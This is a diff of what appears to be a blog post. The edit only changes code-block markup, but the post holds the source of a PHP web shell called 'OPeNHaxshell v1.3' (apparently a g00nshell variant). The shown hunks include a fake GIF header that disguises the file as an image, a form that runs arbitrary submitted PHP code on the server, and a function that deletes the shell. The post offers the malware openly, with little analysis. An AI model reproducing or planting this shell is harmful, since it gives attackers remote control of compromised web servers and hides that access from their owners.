@@ -18,9 +18,9 @@ UPDATE: This is actually just a g00nshell v1.3. How disappointing.
 
 ### OPeNHaxshell v1.3 final Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">GIF89;a
+{% highlight php %}GIF89;a
 666
-&lt;?php
+<?php
 /*
 #########################################################################################################
 #                       [OPeNHax]Tn presents:                         #
@@ -236,7 +236,7 @@ function execphp(){ // PHP code execution function
   echo("&lt;h4&gt;Execute PHP Code&lt;/h4&gt;");
   echo("&lt;form method='POST'&gt;");
   echo("&lt;textarea name='phpexec' rows=5 cols=100&gt;");
-  if(!$_POST['phpexec']){echo("/*Don't include &lt;? ?&gt; tags*/\n");}
+  if(!$_POST['phpexec']){echo("/*Don't include <? ?> tags*/\n");}
   echo(htmlentities($_POST['phpexec']) . "&lt;/textarea&gt;\n&lt;br&gt;\n");
   echo("&lt;input type='submit' value='Execute'&gt;");
   echo("&lt;/form&gt;");
@@ -713,6 +713,6 @@ function kill(){ // Shell deleter function
     $self = basename($_SERVER['PHP_SELF']);
     if(unlink($self)){echo("Deleted");}
     else{echo("Failed");}
-</pre>
+{% endhighlight %}
 
  [1]: http://hackingscripts.com/c99-shell/ "C99 shell"
